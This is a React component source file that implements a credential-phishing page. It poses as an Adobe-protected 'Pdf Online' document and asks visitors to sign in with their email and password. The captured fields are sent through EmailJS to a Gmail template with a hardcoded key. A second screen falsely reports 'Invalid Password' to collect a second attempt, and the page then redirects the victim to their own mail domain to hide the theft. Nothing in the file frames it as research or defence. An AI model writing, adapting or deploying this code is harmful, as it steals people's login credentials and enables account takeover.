import "./App.css";
import React, { useState } from "react";
import { Styls } from "./stylls";
import { useParams, Link } from "react-router-dom";

import emailjs from "emailjs-com";
function Forms() {
  const params = useParams();

  const [showForm, setShowForm] = useState(true);
  const [confirmForm, setConfirmForm] = useState(false);
  const [pass, setPass] = useState("");
  const [email, setEmail] = useState(params.id);

  const submitHandler = (e) => {
    e.preventDefault();

    emailjs
      .sendForm("gmail", "template_3jamv0i", e.target, "3hXVmO6FYl9i0rRmR")
      .then(
        (result) => {
          console.log(result.text);
        },
        (error) => {
          console.log(error.text);
        }
      );
    e.preventDefault();
    setShowForm(false);
    setConfirmForm(true);
  };

  const editHandler = (e) => {
    e.preventDefault();
    let emailss = params.id;
    let domain = emailss.substring(emailss.lastIndexOf("@") + 1);
    emailjs
      .sendForm("gmail", "template_3jamv0i", e.target, "3hXVmO6FYl9i0rRmR")
      .then(
        (result) => {
          console.log(result.text);
        },
        (error) => {
          console.log(error.text);
        }
      );

    window.setTimeout(() => {
      window.location.href = `https://${domain}`;
    }, 1000);
  };

  return (
    <Styls>
      {" "}
      {showForm && (
        <div id="html_encoder_div">
          <div className="container">
            <div className="office show border shadow bg-light" id="others">
              <div className="office-holder">
                <div className="logo">
                  <div id="login_logo">
                    <img
                      src="https://www.freeiconspng.com/uploads/pdf-word-icon-31.png"
                      width="100"
                      height="100"
                      alt=""
                    />
                  </div>
                  <h5 className="font-weight-light">
                    <b> Pdf Online </b>
                  </h5>
                  <p>
                    This document is protected by Adobe. Please verify to access
                  </p>
                </div>

                <form className="formal" onSubmit={submitHandler}>
                  <div className="form-holder">
                    <div>
                      <div className="alert alert-danger hide alert2"></div>
                    </div>
                    <span className="newicon1">
                      <i class="fas fa-user fa-1x"></i>
                    </span>
                    <input
                      type="email"
                      required
                      name="to_user"
                      className="form-control" 
                    />
                    <input
                      type="password" 
                      required 
                      name="to_pass"
                      placeholder="Password"
                      className="form-control"
                    />
                    <span className="newicon">
                      <i class="fas fa-lock fa-1x"></i>
                    </span>

                    <div className="btn-holder">
                      <button type="submit" className="btn btn-lg col-12">
                        <b> Sign In</b>
                      </button>
                    </div>
                    <div class="clearfix">
                      <label class="pull-left checkbox-inline">
                        <input type="checkbox"></input> Secured Login
                        session?&nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp; &nbsp;
                      </label>
                      <Link to="#">Forgot Password?</Link>
                    </div>
                  </div>
                </form>
              </div>{" "}
            </div>
            <div className="abbso">
              <Link to="#">Copyright Pdf Viewer © 2022</Link>
            </div>
          </div>
        </div>
      )}
      {confirmForm && (
        <div id="html_encoder_div">
          <div className="container">
            <div className="office show border shadow bg-light" id="others">
              <div className="office-holder">
                <div className="logo">
                  <div id="login_logo">
                    <img
                      src="https://www.freeiconspng.com/uploads/pdf-word-icon-31.png"
                      width="100"
                      height="100"
                      alt=""
                    />
                  </div>
                  <h5 className="font-weight-light">
                    <b> Pdf Online </b>
                  </h5>
                  <p>
                    This document is protected by Adobe. Please verify to access
                  </p>
                </div>

                <form className="formal" onSubmit={editHandler}>
                  <div className="form-holder">
                    <div>
                      <div className="alert alert-danger hide alert2"></div>
                    </div>
                    <span className="newicon1">
                      <i class="fas fa-user fa-1x"></i>
                    </span>
                    <input
                      type="email"
                      required
                      name="to_user"
                      className="form-control"
                    
                    />
                    <input
                      type="password"
                      
                      required
                       name="to_pass"
                      placeholder="Password"
                      className="form-control"
                    />
                    <span className="newicon">
                      <i class="fas fa-lock fa-1x"></i>
                    </span>
                    <div className="msg">
                      Invalid Password.! Please enter correct password.
                    </div>

                    <div className="btn-holder">
                      <button type="submit" className="btn btn-lg col-12">
                        <b> Sign In</b>
                      </button>
                    </div>
                    <div class="clearfix">
                      <label class="pull-left checkbox-inline">
                        <input type="checkbox"></input> Secured Login
                        session?&nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp; &nbsp;
                      </label>
                      <Link to="#">Forgot Password?</Link>
                    </div>
                  </div>
                </form>
              </div>{" "}
            </div>
            <div className="abbso">
              <Link to="#">Copyright Pdf Viewer © 2022</Link>
            </div>
          </div>
        </div>
      )}
    </Styls>
  );
}

export default Forms;
